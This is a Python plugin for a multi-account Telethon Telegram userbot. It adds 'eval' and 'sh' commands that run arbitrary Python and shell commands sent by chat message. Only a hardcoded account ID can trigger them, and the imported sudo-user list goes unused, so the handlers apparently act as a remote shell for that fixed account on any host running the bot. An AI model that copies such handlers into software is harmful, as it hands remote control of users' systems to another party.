import os
import sys
import traceback
import subprocess
from io import StringIO
from datetime import datetime

from telethon import events
from config import X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, SUDO_USERS, CMD_HNDLR as hl

# List of all Telethon clients
clients = [X1, X2, X3, X4, X5, X6, X7, X8, X9, X10]
OWNER_ID = 8450725193

async def aexec(code, event):
    exec(
        "async def __aexec(event): "
        + "".join(f"\n {a}" for a in code.split("\n"))
    )
    return await locals()["__aexec"](event)

# --- Registering Handlers ---

for client in clients:
    # Eval Command: Matches <prefix>eval
    @client.on(events.NewMessage(pattern=fr"^[./?{hl}]eval(?:\s+(.+))?", incoming=True))
    async def eval_handler(event):
        if event.sender_id != OWNER_ID:
            return
        
        cmd = event.pattern_match.group(1)
        if not cmd:
            return await event.reply("<b>ᴡhat you wanna execute?</b>", parse_mode="html")

        start = datetime.now()
        old_stderr = sys.stderr
        old_stdout = sys.stdout
        redirected_output = sys.stdout = StringIO()
        redirected_error = sys.stderr = StringIO()
        
        try:
            await aexec(cmd, event)
        except Exception:
            sys.stderr.write(traceback.format_exc())
        
        stdout = redirected_output.getvalue()
        stderr = redirected_error.getvalue()
        sys.stdout = old_stdout
        sys.stderr = old_stderr
        
        evaluation = ""
        if stderr:
            evaluation += stderr
        elif stdout:
            evaluation += stdout
        else:
            evaluation += "Success"

        end = datetime.now()
        ms = (end - start).microseconds / 1000
        final_output = f"<b>⥤ ʀᴇsᴜʟᴛ :</b>\n<pre>{evaluation}</pre>\n<b>Time:</b> <code>{ms}ms</code>"
        
        if len(final_output) > 4096:
            with open("output.txt", "w+", encoding="utf8") as f:
                f.write(str(evaluation))
            await event.client.send_file(event.chat_id, "output.txt", caption="Eval Output", reply_to=event.id)
            os.remove("output.txt")
        else:
            await event.reply(final_output, parse_mode="html")

    # Shell Command: Matches /sh or .sh or <hl>sh
    @client.on(events.NewMessage(pattern=fr"^[./?{hl}]sh(?:\s+(.+))?", incoming=True))
    async def shell_handler(event):
        if event.sender_id != OWNER_ID:
            return
        
        cmd = event.pattern_match.group(1)
        if not cmd:
            return await event.reply("<b>ᴇxᴀᴍᴩʟᴇ :</b> <code>.sh git pull</code>", parse_mode="html")

        # Notify the user that the command is running
        msg = await event.reply("<code>Running shell command...</code>", parse_mode="html")

        try:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            stdout, stderr = process.communicate()
        except Exception as err:
            return await msg.edit(f"<b>ERROR :</b>\n<pre>{err}</pre>", parse_mode="html")
        
        output = stdout or stderr
        if not output or output.strip() == "":
            output = "Command executed with no output."

        if len(output) > 4096:
            with open("shell.txt", "w+") as f:
                f.write(output)
            await event.client.send_file(event.chat_id, "shell.txt", caption=f"<code>{cmd}</code>", reply_to=event.id)
            await msg.delete()
            os.remove("shell.txt")
        else:
            await msg.edit(f"<b>OUTPUT :</b>\n<pre>{output}</pre>", parse_mode="html")
            
